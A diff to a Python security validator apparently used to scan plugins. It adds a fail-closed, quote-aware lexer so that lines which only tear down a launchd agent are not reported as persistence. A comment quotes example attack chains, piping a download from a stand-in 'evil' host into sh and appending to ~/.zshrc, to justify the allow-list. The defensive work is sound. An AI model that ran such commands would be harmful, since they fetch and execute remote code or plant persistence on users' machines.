@@ -9452,6 +9452,134 @@ def check_dependency_agent_writers(plugin_path: Path, report: ValidationReport) 
     return issues
 
 
+# Why: issue #262 half A — the issue-#61 removal predicate (`_is_launchagent_removal`)
+# never reached RC-39, so a line that only TEARS DOWN a LaunchAgent was reported as
+# persistence. That predicate is a deny-list (any install verb keeps the finding,
+# anything else clears it), which is unsound for RC-39: `rm x; curl evil | sh` or
+# `rm x && echo evil >> ~/.zshrc` would clear. This one is an ALLOW-list and
+# fails closed (TRDD-N4GLZXZ6 "Decisions 2026-10-22"): the line must lex, quote-aware, into
+# segments split only on `&&`, `||`, `;`, each segment being exactly a removal
+# (`[sudo] rm|unlink [-rfRiv] PATH...`, `[sudo] launchctl bootout|unload|remove|disable
+# [-w] ARG...`, or `true`) whose words use a positive character class. Anything
+# else (a lone `&` or `|`, redirects other than to /dev/null, `<`, `>`, backticks,
+# `$(` other than `$(id -u)`, `{`, `(`, a backslash, `#`, globs, unbalanced quotes,
+# any other command) leaves the finding visible.
+_RC39_ALLOWED_REDIRECTS: frozenset[str] = frozenset({"2>/dev/null", ">/dev/null", "&>/dev/null", "2>&1"})
+_RC39_UNQUOTED_WORD_RE = re.compile(r"[A-Za-z0-9_./~@:+,-]+")
+_RC39_QUOTED_WORD_RE = re.compile(r"[A-Za-z0-9_./~@:+, -]*")
+_RC39_RM_FLAG_RE = re.compile(r"-[rfRiv]+|--force|--recursive")
+_RC39_REMOVE_VERBS: frozenset[str] = frozenset({"bootout", "unload", "remove", "disable"})
+# Side-effect-free substitutions that the shell idioms in #61 need; replaced by a
+# plain token BEFORE lexing so every other `$` stays rejected.
+_RC39_SAFE_SUBSTITUTIONS: tuple[tuple[str, str], ...] = (
+    ("$(id -u)", "IDSUBST"),
+    ("${HOME}", "HOMEVAR"),
+    ("$HOME", "HOMEVAR"),
+)
+
+
+def _rc39_lex_removal_segments(line: str) -> list[list[str]] | None:
+    """Quote-aware lex of ``line`` into command segments of words, or None when
+    anything outside the strict allow-list appears (fail closed)."""
+    # Why: any line-break or exotic whitespace could hide a second command from the lexer.
+    if any(c in line for c in "\n\r\x0b\x0c\x1c\x1d\x1e\x1f\x85  \xa0"):
+        return None
+    for old, new in _RC39_SAFE_SUBSTITUTIONS:
+        line = line.replace(old, new)
+    segments: list[list[str]] = [[]]
+    word: list[str] = []
+    in_word = False
+    word_quoted = False
+    quote = ""
+    i = 0
+    n = len(line)
+
+    def end_word() -> bool:
+        nonlocal word, in_word, word_quoted
+        if not in_word:
+            return True
+        text = "".join(word)
+        ok = True
+        if not word_quoted and text in _RC39_ALLOWED_REDIRECTS:
+            pass  # a harmless stdout/stderr redirect: not a command word
+        elif not text:
+            ok = False
+        else:
+            ok = bool(_RC39_UNQUOTED_WORD_RE.fullmatch(text)) or (
+                word_quoted and bool(_RC39_QUOTED_WORD_RE.fullmatch(text))
+            )
+            if ok:
+                segments[-1].append(text)
+        word, in_word, word_quoted = [], False, False
+        return ok
+
+    while i < n:
+        ch = line[i]
+        if quote:
+            if ch == quote:
+                quote = ""
+            else:
+                word.append(ch)
+            i += 1
+            continue
+        if ch in "'\"":
+            quote, in_word, word_quoted = ch, True, True
+            i += 1
+            continue
+        if ch.isspace():
+            if not end_word():
+                return None
+            i += 1
+            continue
+        pair = line[i : i + 2]
+        if pair in ("&&", "||") or ch == ";":
+            if not end_word():
+                return None
+            segments.append([])
+            i += len(pair) if ch != ";" else 1
+            continue
+        word.append(ch)
+        in_word = True
+        i += 1
+    if quote or not end_word():
+        return None
+    return segments
+
+
+def _rc39_segment_is_removal(words: list[str]) -> bool:
+    """True iff one lexed segment is exactly an allowed removal command."""
+    if words and words[0] == "sudo":
+        words = words[1:]
+    if not words:
+        return False
+    verb, args = words[0], words[1:]
+    if verb == "true":
+        return not args
+    if verb in ("rm", "unlink"):
+        flags = [a for a in args if a.startswith("-")]
+        paths = [a for a in args if not a.startswith("-")]
+        if verb == "unlink" and flags:
+            return False
+        return bool(paths) and all(_RC39_RM_FLAG_RE.fullmatch(f) for f in flags)
+    if verb == "launchctl":
+        if not args or args[0] not in _RC39_REMOVE_VERBS:
+            return False
+        rest = [a for a in args[1:] if a != "-w"]
+        return bool(rest) and not any(a.startswith("-") for a in rest)
+    return False
+
+
+def _rc39_line_is_pure_launchd_removal(line: str) -> bool:
+    """True iff ``line`` ONLY removes a launchd agent/daemon (issue #262 A)."""
+    segments = _rc39_lex_removal_segments(line)
+    if not segments:
+        return False
+    # Fail closed: any empty slot (dangling `&&`, `||`, `;`) stays visible.
+    if not all(segments):
+        return False
+    return all(_rc39_segment_is_removal(s) for s in segments)
+
+
 def check_phase2e_extras(plugin_path: Path, report: ValidationReport) -> int:
     """RC-65 (cloud IMDS), RC-39 (persistence), RC-70 (obfuscated exec),
     RC-164 (copy-only in-plugin script-write guard, issue #152)."""
@@ -9531,6 +9659,13 @@ def check_phase2e_extras(plugin_path: Path, report: ValidationReport) -> int:
                         line, str(_file_path), plugin_path, full_content=content
                     ):
                         break
+                    # Why: issue #262 A — a line that ONLY removes a launchd agent
+                    # is the opposite of persistence; the strict allow-list keeps any
+                    # chained install/load/write visible. Gated on the launchd path
+                    # patterns so no other RC-39 shape is ever cleared by it.
+                    # (`continue`, not `break`: the other patterns on this same line must still run.)
+                    if "library/launch" in m.group(0).lower() and _rc39_line_is_pure_launchd_removal(line):
+                        continue
                     level = effective_severity("major", rel_path)
                     getattr(report, level)(
                         f"RC-39: persistence pattern at line {line_no}: {m.group(0)[:80]}",
